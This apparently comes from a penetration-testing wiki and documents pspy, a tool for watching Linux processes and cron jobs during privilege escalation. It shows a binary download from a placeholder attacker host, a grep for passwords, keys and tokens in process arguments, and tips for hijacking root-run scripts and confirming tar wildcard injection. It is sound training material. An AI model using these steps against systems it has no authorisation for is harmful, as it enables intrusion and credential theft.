---
tags: [tool]
module: linux_privilege_escalation
last_updated: 2026-05-10
source_count: 1
---

# pspy

Unprivileged process monitor for Linux that reveals cron jobs, service execution, and process activity without requiring root access.

## Overview

pspy monitors the `/proc` filesystem and inotify events to detect process creation in real time. It shows the full command line of every executed process, including those spawned by root and cron daemons — without needing root privileges itself. This makes it the standard tool for confirming cron job execution, discovering what scheduled tasks run as root, identifying short-lived processes, and watching for credential exposure in command arguments.

The primary use case in privilege escalation is: you suspect a cron job exists but can't read the crontab, or you want to confirm the timing and exact command of a scheduled task before exploiting it.

## Install / Transfer

pspy ships as a statically compiled binary — no dependencies required.

```bash
# On attacker host — serve the binary
python3 -m http.server 8000

# On target — download the appropriate architecture binary
# 64-bit:
wget http://<attacker>:8000/pspy64
chmod +x pspy64

# 32-bit:
wget http://<attacker>:8000/pspy32
chmod +x pspy32

# Confirm architecture if unsure
uname -m
file /bin/ls
```

Download pre-compiled binaries from: https://github.com/DominicBreuker/pspy/releases

## Usage

```bash
# Standard run — print commands and filesystem events, scan every 1 second
./pspy64 -pf -i 1000

# Just process events, no filesystem events (less noise)
./pspy64 -p

# Filesystem events only
./pspy64 -f

# Custom scan interval (in milliseconds)
./pspy64 -i 500   # scan every 500ms

# Run in background, capture to file
nohup ./pspy64 -pf -i 1000 > /tmp/pspy.out 2>&1 &
```

## Output Format

Each line shows a process event with:
- Timestamp
- Event type (CMD = process, FS = filesystem event)
- UID of the process owner
- PID
- Full command line

```
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create ...
```

From this output, you can see:
- The cron daemon (`UID=0`) fired at 20:46:01
- It executed `/dmz-backups/backup.sh` as root
- The script in turn ran `tar` — a potential wildcard injection target

## Flags & Options

| Flag | Description |
|---|---|
| `-p` | Print commands (process events) |
| `-f` | Print filesystem events |
| `-i <ms>` | procfs scan interval in milliseconds (default: 100) |
| `-r <dir>` | Watch these directories for inotify events (recursive) |
| `-R <dir>` | Watch these directories for inotify events (non-recursive) |
| `-c` | Enable colored output |
| `-v` | Verbose mode |

## Typical Use Cases

**Confirming and timing a cron job:**

```bash
./pspy64 -pf -i 1000
# Wait and watch — cron jobs will appear as UID=0 commands
# Note the timing between executions to determine the schedule
```

**Discovering credential exposure in process arguments:**

```bash
./pspy64 -p | grep -i "pass\|key\|token\|secret"
# Some processes pass credentials as command-line arguments
# These appear in full in pspy output
```

**Identifying scripts to hijack:**

```bash
./pspy64 -pf -i 1000
# Look for UID=0 processes running scripts in world-writable directories
# Common pattern: /bin/sh -c /tmp/some_script.sh
#                 /bin/bash /home/user/backup.sh
```

**Confirming wildcard cron abuse worked:**

```bash
# After creating the checkpoint files for tar wildcard injection
./pspy64 -pf -i 1000
# Confirm tar executes with your injected arguments when cron fires
```

## Gotchas & Notes

- pspy works by polling `/proc` — very short-lived processes (sub-100ms) may be missed at default intervals; use `-i 50` to reduce the window
- Inotify watches cover key directories by default: `/usr`, `/tmp`, `/etc`, `/home`, `/var`, `/opt` (recursive)
- pspy itself is not detectable by standard privilege checks — it runs without elevated permissions
- On heavily loaded systems, the output is dense; pipe through `grep` or capture to file and filter
- pspy does not show processes that completed before it started — run it before the next cron cycle
- The binary is statically linked so it works across different glibc versions; verify the arch (32 vs 64 bit) matches the target

## Installation

pspy is not installed system-wide — it is a standalone binary downloaded and uploaded to the target.

```bash
# Check if downloaded to the local staging area
ls /opt/pspy/ 2>/dev/null || echo "not staged"

# Download both architectures (64-bit and 32-bit)
sudo mkdir -p /opt/pspy
sudo curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 \
    -o /opt/pspy/pspy64
sudo curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 \
    -o /opt/pspy/pspy32
sudo chmod +x /opt/pspy/pspy64 /opt/pspy/pspy32

# Verify
ls -lh /opt/pspy/
```

> **Note:** pspy is run ON THE TARGET as an unprivileged user, not on Kali. Determine target architecture with `uname -m` (x86_64 → pspy64, i686 → pspy32) before uploading.

## Related Pages

- [[attack/linux_privilege_escalation]]
- [[attack/linux_privesc_enumeration]]
- [[attack/linux_privesc_services]]
- [[tools/enumeration/linpeas]]

## Sources

- raw/linux_privilege_escalation/service_based_privilege_escalation_cron_job_abuse.md
